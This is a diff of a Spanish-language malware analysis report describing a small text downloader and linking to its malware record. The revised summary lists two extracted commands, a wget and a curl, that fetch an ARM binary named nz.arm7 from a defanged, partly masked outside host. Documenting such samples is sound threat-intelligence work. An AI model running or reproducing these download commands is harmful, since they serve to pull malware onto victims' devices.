@@ -4,7 +4,10 @@
 
 ## 📌 Resumen
 
-Artefacto identificado como ASCII text, with CRLF line terminators de 488 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `nz.arm7` en `hxxp://94.154.43.XXX/nz/nz.arm7`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.
+Texto ASCII de 488 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `nz.arm7` en `hxxp://94.154.43.XXX/nz/nz.arm7`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**
+
+1. `wget hxxp://94.154.43.XXX/nz/nz.arm7`
+2. `curl -O hxxp://94.154.43.XXX/` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Ficha malware:** [malware-like/oraculo/downloader/cf3fe5d2b21fb326de5d4b3561d6fdfe5073dba64c24a95c30a26b691c93dd8f.md](../../../../../malware-like/oraculo/downloader/cf3fe5d2b21fb326de5d4b3561d6fdfe5073dba64c24a95c30a26b691c93dd8f.md)
 
 
 ## 🏷️ Clasificación
